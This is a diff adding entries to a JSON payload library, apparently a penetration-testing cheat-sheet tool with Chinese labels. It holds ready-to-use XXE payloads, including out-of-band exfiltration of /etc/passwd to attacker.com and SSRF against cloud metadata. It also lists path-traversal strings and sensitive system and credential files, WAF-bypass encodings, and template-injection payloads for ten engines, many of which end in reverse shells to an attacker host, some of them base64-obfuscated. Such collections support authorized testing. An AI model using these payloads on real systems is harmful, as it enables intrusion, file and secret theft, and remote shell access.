@@ -564,7 +564,278 @@
       "id": "cat_xxe",
       "name": "XXE",
       "expanded": true,
-      "subCategories": []
+      "subCategories": [
+        {
+          "id": "b885f0d2-ed3a-46f6-b91f-b4888797eb60",
+          "name": "基础XXE",
+          "entries": [
+            {
+              "id": "8506229b-7994-4455-98db-3d09739f29ab",
+              "title": "payload",
+              "payload": "# STEP 1 - 1. 探测XXE\n\u003c?xml version\u003d\"1.0\"?\u003e\n\u003c!DOCTYPE foo [\n  \u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u003e\n]\u003e\n\u003croot\u003e\u0026xxe;\u003c/root\u003e\n\n# STEP 2 - 2. 读取文件\n\u003c?xml version\u003d\"1.0\"?\u003e\n\u003c!DOCTYPE foo [\n  \u003c!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\"\u003e\n]\u003e\n\u003croot\u003e\u0026xxe;\u003c/root\u003e\n\n# STEP 3 - 3. 读取PHP源码\n\u003c?xml version\u003d\"1.0\"?\u003e\n\u003c!DOCTYPE foo [\n  \u003c!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource\u003dindex.php\"\u003e\n]\u003e\n\u003croot\u003e\u0026xxe;\u003c/root\u003e\n\n# STEP 4 - 4. SSRF攻击\n\u003c?xml version\u003d\"1.0\"?\u003e\n\u003c!DOCTYPE foo [\n  \u003c!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\"\u003e\n]\u003e\n\u003croot\u003e\u0026xxe;\u003c/root\u003e"
+            }
+          ]
+        },
+        {
+          "id": "f2083014-1b2b-4f0d-9225-c4f447862899",
+          "name": "盲XXE",
+          "entries": [
+            {
+              "id": "26dbe1d0-74c6-4d5f-ba7a-419efd6f87b8",
+              "title": "payload",
+              "payload": "# STEP 1 - 1. 外部实体探测\n\u003c?xml version\u003d\"1.0\"?\u003e\n\u003c!DOCTYPE foo [\n\u003c!ENTITY xxe SYSTEM \"http://attacker.com/xxe\"\u003e\n]\u003e\n\u003cfoo\u003e\u0026xxe;\u003c/foo\u003e\n\n# STEP 2 - 2. 参数实体\n\u003c?xml version\u003d\"1.0\"?\u003e\n\u003c!DOCTYPE foo [\n\u003c!ENTITY % xxe SYSTEM \"http://attacker.com/xxe.dtd\"\u003e\n%xxe;\n]\u003e\n\u003cfoo\u003etest\u003c/foo\u003e\n\n# STEP 3 - 3. OOB外带数据\n\u003c?xml version\u003d\"1.0\"?\u003e\n\u003c!DOCTYPE foo [\n\u003c!ENTITY % xxe SYSTEM \"http://attacker.com/xxe.dtd\"\u003e\n%xxe;\n]\u003e\n\u003cfoo\u003etest\u003c/foo\u003e\n\n# xxe.dtd内容\n\u003c!ENTITY % file SYSTEM \"file:///etc/passwd\"\u003e\n\u003c!ENTITY % eval \"\u003c!ENTITY \u0026#x25; exfil SYSTEM \u0027http://attacker.com/?d\u003d%file;\u0027\u003e\"\u003e\n%eval;\n%exfil;"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "6ef2a497-fb59-4fd0-8523-3966b78ab043",
+      "name": "任意文件读取",
+      "expanded": true,
+      "subCategories": [
+        {
+          "id": "8a2cabd5-9e48-4e0c-a437-793ddcd73272",
+          "name": "Windows",
+          "entries": [
+            {
+              "id": "cafebb6a-2e4f-494c-88fd-6f46fc1c0d69",
+              "title": "探测本地文件读取",
+              "payload": "?file\u003d../../../etc/passwd\n?file\u003d....//....//....//etc/passwd\n?file\u003d..\\..\\..\\windows\\win.ini\n?page\u003dphp://filter/convert.base64-encode/resource\u003dindex.php"
+            },
+            {
+              "id": "1b328da6-5bbe-439e-9206-d494483bb398",
+              "title": "读取Windows下敏感文件",
+              "payload": "C:\\Windows\\win.ini\nC:\\Windows\\system.ini\nC:\\Windows\\system32\\drivers\\etc\\hosts\nC:\\Windows\\System32\\config\\SAM\nC:\\Windows\\System32\\config\\SYSTEM\nC:\\Windows\\System32\\inetsrv\\config\\applicationHost.config\nC:\\inetpub\\wwwroot\\web.config\nC:\\Users\\Default\\NTUSER.DAT\nC:\\Users\\Public\\Desktop\\desktop.ini\nC:\\Windows\\System32\\winevt\\Logs\\System.evtx\nC:\\Windows\\System32\\winevt\\Logs\\Security.evtx\nC:\\my.ini\nC:\\Windows\\my.ini"
+            },
+            {
+              "id": "4f6cc129-11f1-4f2d-9b8a-0e75d652aebc",
+              "title": "路径穿越通杀写法",
+              "payload": "..\\..\\..\\..\\windows\\win.ini\n....\\....\\....\\windows\\win.ini\n..\\..\\..\\windows\\system32\\drivers\\etc\\hosts\n../../../../windows/win.ini\n....//....//windows/win.ini"
+            },
+            {
+              "id": "5e77d13a-2f6e-4c11-8b33-9d7a65c0jfle",
+              "title": "数据库配置文件",
+              "payload": "C:\\my.ini\nC:\\Windows\\my.ini\nC:\\MySQL\\my.ini\nC:\\xampp\\mysql\\bin\\my.ini\nC:\\wamp64\\bin\\mysql\\mysql5.7.26\\my.ini"
+            }
+          ]
+        },
+        {
+          "id": "fd021ec2-ac8c-480e-ba18-73585c50fe06",
+          "name": "Linux",
+          "entries": [
+            {
+              "id": "7d99f25c-7e3a-4f11-b1ac-3ed5ac7c56f7",
+              "title": "Linux通用敏感文件",
+              "payload": "/etc/passwd\n/etc/shadow\n/etc/hosts\n/etc/group\n/etc/resolv.conf\n/etc/crontab\n/etc/rc.local\n/proc/cpuinfo\n/proc/meminfo\n/proc/net/arp\n/proc/net/fib_trie\n/proc/self/environ\n/root/.bash_history\n/home/user/.bash_history\n/var/log/messages\n/var/log/auth.log\n/var/log/apache2/access.log\n/var/log/nginx/access.log\n/etc/apache2/apache2.conf\n/etc/nginx/nginx.conf\n/etc/my.cnf\n/etc/tomcat/tomcat-users.xml"
+            }
+          ]
+        },
+        {
+          "id": "f96e0abf-d414-4660-860a-231fce737800",
+          "name": "中间件",
+          "entries": [
+            {
+              "id": "8eabf36d-7c2a-4f15-9c7d-2e3dbb4f56c7",
+              "title": "中间件配置文件",
+              "payload": "apache: /etc/apache2/apache2.conf\nnginx: /etc/nginx/nginx.conf\ntomcat: /etc/tomcat/tomcat-users.xml\nIIS: C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config\nphpstudy: C:\\phpstudy\\WWW\\config.ini\nxampp: C:\\xampp\\apache\\conf\\httpd.conf\nC:\\Windows\\System32\\inetsrv\\config\\applicationHost.config\nC:\\inetpub\\wwwroot\\web.config\nC:\\xampp\\apache\\conf\\httpd.conf\nC:\\xampp\\tomcat\\conf\\tomcat-users.xml"
+            }
+          ]
+        },
+        {
+          "id": "e80039f6-4d67-4f1d-92b1-d5666177e914",
+          "name": "Bypass WAF",
+          "entries": [
+            {
+              "id": "f9e5c01b-5be7-45d9-90b1-4ce87ec8af28",
+              "title": "编码绕过",
+              "payload": "?filename\u003d.+./.+./bin/redacted.dll\n?filename\u003d.%00./file.php\n/etc/passwd%00.jpg\n?filename\u003d..%5c..%5c/windows/win.ini\nJava %c0%ae 安全模式绕过\n?filename\u003d%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd\ne\\c\\h\\o$IFS-e$IFS\u0027\\x63\\x61\\x74\\x20\\x2F\\x65\\x74\\x63\\x2F\\x70\\x61\\x73\\x73\\x77\\x64\u0027|/???/\\b**\\h  读取/etc/passwd\n../\\/\\/\\\n?filename\u003d..%2F..%2F..%2F..%2Fetc%2Fpasswd\n?filename\u003d..%252F..%252F..%252F..%252Fetc%2Fpasswd\n..%25%35%63..%25%35%63etc/passwd\n..%c0%af..%c0%afetc/passwd"
+            },
+            {
+              "id": "d0d9559b-3cc1-46d1-ac32-019ac190fa22",
+              "title": "Ghost Bit java幽灵bit绕过",
+              "payload": "\\u0f2e\\u1a25\\ua375\\u3430\\ueb30\\u8e32\\u2c65/\\ud22e\\ud625\\u7e75\\u0530\\uc530\\u2432\\u0965/\\ua82e\\u5d25\\u1175\\u5830\\u7f30\\u6132\\u7e65/\\u1e2e\\ufd25\\u3b75\\u7030\\u5430\\ue632\\u0c65/\\ue22e\\uee25\\u5675\\u8130\\ue730\\u5a32\\uc465/\\u732e\\u5025\\u0875\\u5c30\\u4130\\u3232\\u1a65/\\u7e2e\\u5825\\u4675\\ud630\\u3130\\uf032\\ubc65/etc/passw%64\n\\u732e\\u6625\\u5975\\u7030\\u9f30\\u7e32\\u6465/\\u702e\\u5425\\u7175\\u7030\\u6d30\\u8532\\u9565/\\u572e\\u6125\\u8375\\u9230\\u7c30\\u5832\\u5a65/\\u9b2e\\u8825\\u5a75\\u8630\\u5b30\\u5d32\\u5a65/\\u4e2e\\u8125\\u6375\\u6630\\u7b30\\u8032\\u9d65/\\u662e\\u7b25\\u8375\\u6b30\\u9f30\\u8e32\\u7465/\\u782e\\u6925\\u7f75\\u6830\\u5230\\u7c32\\u6665/etc/passw%64\n"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "e801de95-67e4-4700-abd3-c4be228d1c8f",
+      "name": "SSTI模板注入",
+      "expanded": true,
+      "subCategories": [
+        {
+          "id": "4e079838-a867-4b03-9e44-b0101af21ae5",
+          "name": "Jinja2/Twig模板注入",
+          "entries": [
+            {
+              "id": "5a4e2ae9-67bd-4201-96c1-f07f62df0999",
+              "title": "payload",
+              "payload": "{{7*7}} ${7*7} \u003c%\u003d 7*7 %\u003e {{config}} 如果输出49或配置信息，则存在SSTI\n{{config}} {{self}} {{request}} {{\"\".__class__.__mro__}} {{\"\".__class__.__mro__[1].__subclasses__()}} 收集信息\n{{\u0027\u0027.__class__.__mro__[2].__subclasses__()[40](\u0027/etc/passwd\u0027).read()}} {{config.__class__.__init__.__globals__[\u0027os\u0027].popen(\u0027id\u0027).read()}} {{request.application.__globals__.__builtins__.__import__(\u0027os\u0027).popen(\u0027id\u0027).read()}} 执行系统命令\n{{config.__class__.__init__.__globals__[\u0027os\u0027].popen(\u0027bash -c \"bash -i \u003e\u0026 /dev/tcp/attacker/4444 0\u003e\u00261\"\u0027).read()}} 反弹shell"
+            }
+          ]
+        },
+        {
+          "id": "63400967-5d37-49bf-9c5d-00cd074f1135",
+          "name": "FreeMarker模板注入",
+          "entries": [
+            {
+              "id": "ssti-fm-001",
+              "title": "探测SSTI",
+              "payload": "${7*7}\n${\"freemarker\"}\n\u003c#assign ex\u003d\"freemarker\"\u003e 输出49/freemarker则存在"
+            },
+            {
+              "id": "ssti-fm-002",
+              "title": "信息收集",
+              "payload": "${.version}\n${.current_template_name}\n${.lang}\n${system_property[\"java.version\"]}\n${system_property[\"os.name\"]}"
+            },
+            {
+              "id": "ssti-fm-003",
+              "title": "命令执行 - new",
+              "payload": "\u003c#assign ex\u003d\"freemarker.template.utility.Execute\"?new()\u003e${ex(\"id\")}\n\u003c#assign ex\u003d\"freemarker.template.utility.Execute\"?new()\u003e${ex(\"whoami\")}"
+            },
+            {
+              "id": "ssti-fm-004",
+              "title": "命令执行 - api",
+              "payload": "\u003c#assign api\u003d\"freemarker.template.utility.ObjectConstructor\"?new()\u003e${api(\"java.lang.Runtime\",\"getRuntime\").exec(\"id\")}\n\u003c#assign api\u003d\"freemarker.template.utility.ObjectConstructor\"?new()\u003e${api(\"java.lang.ProcessBuilder\",\"/bin/sh\",\"-c\",\"id\").start()}"
+            },
+            {
+              "id": "ssti-fm-005",
+              "title": "反弹Shell",
+              "payload": "\u003c#assign ex\u003d\"freemarker.template.utility.Execute\"?new()\u003e${ex(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA\u003d\u003d}|{base64,-d}|{bash,-i}\")}"
+            }
+          ]
+        },
+        {
+          "id": "e3a3e9ff-6a0b-48cb-8245-402f4b5ac0c4",
+          "name": "Velocity模板注入",
+          "entries": [
+            {
+              "id": "ssti-vt-001",
+              "title": "探测SSTI",
+              "payload": "#set($x\u003d7*7)$x\n$velocityVersion\n$class.inspect(\"java.lang.Runtime\") 输出49则存在"
+            },
+            {
+              "id": "ssti-vt-002",
+              "title": "信息收集",
+              "payload": "$class.inspect(\"java.lang.System\")\n$class.inspect(\"java.lang.Runtime\")\n$sys.class.forName(\"java.lang.Runtime\")"
+            },
+            {
+              "id": "ssti-vt-003",
+              "title": "命令执行 - ClassTool",
+              "payload": "#set($rt\u003d$class.inspect(\"java.lang.Runtime\")) #set($chr\u003d$class.inspect(\"java.lang.Character\")) #set($ex\u003d$rt.getRuntime().exec(\"id\")) $ex.waitFor() #set($is\u003d$ex.getInputStream()) #set($br\u003d$class.inspect(\"java.io.BufferedReader\").newInstance($class.inspect(\"java.io.InputStreamReader\").newInstance($is))) #set($line\u003d$br.readLine()) $line"
+            },
+            {
+              "id": "ssti-vt-004",
+              "title": "命令执行 - 反射",
+              "payload": "#set($rt\u003d$Class.forName(\"java.lang.Runtime\")) #set($m\u003d$rt.getDeclaredMethod(\"getRuntime\")) #set($obj\u003d$m.invoke(null)) #set($ex\u003d$rt.getDeclaredMethod(\"exec\",$Class.forName(\"java.lang.String\")).invoke($obj,\"id\"))"
+            },
+            {
+              "id": "ssti-vt-005",
+              "title": "反弹Shell",
+              "payload": "#set($rt\u003d$Class.forName(\"java.lang.Runtime\")) #set($m\u003d$rt.getDeclaredMethod(\"getRuntime\")) #set($obj\u003d$m.invoke(null)) #set($ex\u003d$rt.getDeclaredMethod(\"exec\",$Class.forName(\"java.lang.String\")).invoke($obj,\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA\u003d\u003d}|{base64,-d}|{bash,-i}\"))"
+            }
+          ]
+        },
+        {
+          "id": "f7a78884-0034-4e62-aa79-6b80c1f3cf92",
+          "name": "Thymeleaf模板注入",
+          "entries": [
+            {
+              "id": "ssti-th-001",
+              "title": "探测SSTI",
+              "payload": "${7*7}\n#{7*7}\n*{7*7}\n[[${7*7}]] 输出49则存在"
+            },
+            {
+              "id": "ssti-th-002",
+              "title": "信息收集",
+              "payload": "${T(java.lang.System).getenv()}\n${T(java.lang.Runtime).getRuntime().exec(\"id\")}\n${T(java.lang.Class).forName(\"java.lang.Runtime\")}"
+            },
+            {
+              "id": "ssti-th-003",
+              "title": "命令执行 - Spring表达式",
+              "payload": "${T(java.lang.Runtime).getRuntime().exec(\"id\")}\n${T(java.lang.Runtime).getRuntime().exec(\"whoami\")}\n${T(java.lang.ProcessBuilder).newInstance(\"id\").start()}"
+            },
+            {
+              "id": "ssti-th-004",
+              "title": "命令执行 - ProcessBuilder",
+              "payload": "${new java.lang.ProcessBuilder(new String[]{\"id\"}).start()}\n${new java.lang.ProcessBuilder(new String[]{\"bash\",\"-c\",\"id\"}).start()}\n${new java.lang.ProcessBuilder(new String[]{\"cmd\",\"/c\",\"whoami\"}).start()}"
+            },
+            {
+              "id": "ssti-th-005",
+              "title": "反弹Shell",
+              "payload": "${T(java.lang.Runtime).getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA\u003d\u003d}|{base64,-d}|{bash,-i}\")}"
+            }
+          ]
+        },
+        {
+          "id": "3aed721c-85f8-4db2-bcac-8fd6b26ea1b6",
+          "name": "Smarty模板注入",
+          "entries": [
+            {
+              "id": "eca9e741-0960-4e71-ac06-03af38f02b55",
+              "title": "payload",
+              "payload": "# STEP 1 - 1. 探测SSTI\n{$smarty.version}\n{7*7}\n{$smarty.template}\n如果输出版本或49，则存在SSTI\n\n# STEP 2 - 2. 信息收集\n{$smarty.server.PHP_SELF}\n{$smarty.server.SERVER_NAME}\n{$smarty.const.PHP_VERSION}\n\n# STEP 3 - 3. 命令执行 - system\n{system(\"id\")}\n{system(\"whoami\")}\n{system(\"cat /etc/passwd\")}\n\n# STEP 4 - 4. 命令执行 - passthru\n{passthru(\"id\")}\n{passthru(\"ls -la\")}\n{passthru(\"cat /etc/passwd\")}\n\n# STEP 5 - 5. 命令执行 - exec\n{exec(\"id\",$output)}\n{foreach from\u003d$output item\u003dline}{$line}{/foreach}\n\n# STEP 6 - 6. 反弹Shell\n{system(\"bash -c \\\"bash -i \u003e\u0026 /dev/tcp/attacker/4444 0\u003e\u00261\\\"\")}\n{system(\"nc -e /bin/sh attacker 4444\")}"
+            }
+          ]
+        },
+        {
+          "id": "33decc99-637c-4778-91bc-40085bfd5f81",
+          "name": "Mako模板注入",
+          "entries": [
+            {
+              "id": "af47938c-c8b0-4957-b1ce-3dc768f3d696",
+              "title": "payload",
+              "payload": "# STEP 1 - 1. 探测SSTI\n${7*7}\n${self}\n${self.module}\n如果输出49或模块信息，则存在SSTI\n\n# STEP 2 - 2. 信息收集\n${self.module.cache.util}\n${self.module.cache.util.os}\n${dir(self)}\n\n# STEP 3 - 3. 命令执行 - os模块\n${self.module.cache.util.os.popen(\"id\").read()}\n${self.module.cache.util.os.popen(\"whoami\").read()}\n${self.module.cache.util.os.system(\"id\")}\n\n# STEP 4 - 4. 命令执行 - subprocess\n\u003c%\nimport subprocess\n%\u003e\n${subprocess.check_output([\"id\",\"-a\"])}\n${subprocess.Popen([\"id\"],stdout\u003dsubprocess.PIPE).communicate()[0]}\n\n# STEP 5 - 5. 反弹Shell\n${self.module.cache.util.os.popen(\"bash -c \\\"bash -i \u003e\u0026 /dev/tcp/attacker/4444 0\u003e\u00261\\\"\").read()}"
+            }
+          ]
+        },
+        {
+          "id": "a56d1019-6f71-467d-8ddd-ddec1cb1ef88",
+          "name": "Tornado模板注入",
+          "entries": [
+            {
+              "id": "9c13635d-cd66-467c-ae9e-32125d70ce61",
+              "title": "payload",
+              "payload": "# STEP 1 - 1. 探测SSTI\n{{7*7}}\n{{handler}}\n{{request}}\n如果输出49或handler对象，则存在SSTI\n\n# STEP 2 - 2. 信息收集\n{{handler.settings}}\n{{handler.application}}\n{{request.headers}}\n{{request.cookies}}\n\n# STEP 3 - 3. 命令执行 - os\n{% import os %}\n{{os.popen(\"id\").read()}}\n{{os.popen(\"whoami\").read()}}\n{{os.system(\"id\")}}\n\n# STEP 4 - 4. 命令执行 - subprocess\n{% import subprocess %}\n{{subprocess.check_output([\"id\",\"-a\"])}}\n{{subprocess.Popen([\"id\"],stdout\u003d-1).communicate()[0]}}\n\n# STEP 5 - 5. 反弹Shell\n{% import os %}\n{{os.popen(\"bash -c \\\"bash -i \u003e\u0026 /dev/tcp/attacker/4444 0\u003e\u00261\\\"\").read()}}"
+            }
+          ]
+        },
+        {
+          "id": "384a8aa9-a5f6-4584-85e7-cc7b1fc6ca83",
+          "name": "Django模板注入",
+          "entries": [
+            {
+              "id": "8213f55a-e58f-420b-a254-3c03bfa337f8",
+              "title": "payload",
+              "payload": "# STEP 1 - 1. 探测SSTI\n{{7*7}}\n{% if 1\u003d1 %}vulnerable{% endif %}\n{{request}}\n如果输出49或request对象，则存在SSTI\n\n# STEP 2 - 2. 信息收集\n{{request.META}}\n{{request.user}}\n{{request.session}}\n{{settings.SECRET_KEY}}\n\n# STEP 3 - 3. 命令执行 - 通过settings\n{{settings.TEMPLATES}}\n{{settings.DATABASES}}\n# Django模板默认沙箱，难以直接执行命令\n# 需要找到可利用的对象链\n\n# STEP 4 - 4. 命令执行 - 对象链\n{{request.user.groups.model._meta.apps}}\n{{request.user.user_permissions.model._meta.apps}}\n# 尝试访问Django内部对象\n\n# STEP 5 - 5. 敏感信息泄露\n{{settings.SECRET_KEY}}\n{{settings.DATABASES}}\n{{settings.ALLOWED_HOSTS}}\n{{settings.DEBUG}}"
+            }
+          ]
+        },
+        {
+          "id": "2bf4426c-dd18-47bf-bcf2-fecfa0df4fc1",
+          "name": "ERB模板注入",
+          "entries": [
+            {
+              "id": "e20f63eb-3e2f-40ae-b593-3c636fb832fa",
+              "title": "payload",
+              "payload": "# STEP 1 - 1. 探测SSTI\n\u003c%\u003d 7*7 %\u003e\n\u003c%\u003d self %\u003e\n\u003c%\u003d __FILE__ %\u003e\n如果输出49或文件信息，则存在SSTI\n\n# STEP 2 - 2. 信息收集\n\u003c%\u003d Dir.pwd %\u003e\n\u003c%\u003d ENV.inspect %\u003e\n\u003c%\u003d `id` %\u003e\n\u003c%\u003d File.read(\"/etc/passwd\") %\u003e\n\n# STEP 3 - 3. 命令执行 - 反引号\n\u003c%\u003d `id` %\u003e\n\u003c%\u003d `whoami` %\u003e\n\u003c%\u003d `cat /etc/passwd` %\u003e\n\u003c%\u003d `ls -la` %\u003e\n\n# STEP 4 - 4. 命令执行 - system\n\u003c%\u003d system(\"id\") %\u003e\n\u003c%\u003d system(\"whoami\") %\u003e\n\u003c%\u003d exec(\"id\") %\u003e\n\u003c%\u003d IO.popen(\"id\").read %\u003e"
+            }
+          ]
+        },
+        {
+          "id": "656e0e74-23e4-4d3e-9b2d-e416987d0d87",
+          "name": "Pug/Jade模板注入",
+          "entries": [
+            {
+              "id": "cd13b99c-7297-48b7-bab5-3c0b6aac4db2",
+              "title": "payload",
+              "payload": "# STEP 1 - 1. 探测SSTI\n#{7*7}\n#{this}\n#{global}\n如果输出49或global对象，则存在SSTI\n\n# STEP 2 - 2. 信息收集\n#{process}\n#{process.env}\n#{global.process}\n#{require}\n\n# STEP 3 - 3. 命令执行 - child_process\n- var exec \u003d require(\"child_process\").exec\n#{exec(\"id\", function(err, stdout, stderr) { console.log(stdout) })}\n- require(\"child_process\").exec(\"id\")\n\n# STEP 4 - 4. 命令执行 - execSync\n- var execSync \u003d require(\"child_process\").execSync\n#{execSync(\"id\").toString()}\n#{require(\"child_process\").execSync(\"id\").toString()}\n\n# STEP 5 - 5. 反弹Shell\n- require(\"child_process\").exec(\"bash -c \\\"bash -i \u003e\u0026 /dev/tcp/attacker/4444 0\u003e\u00261\\\"\")"
+            }
+          ]
+        }
+      ]
     }
   ]
 }
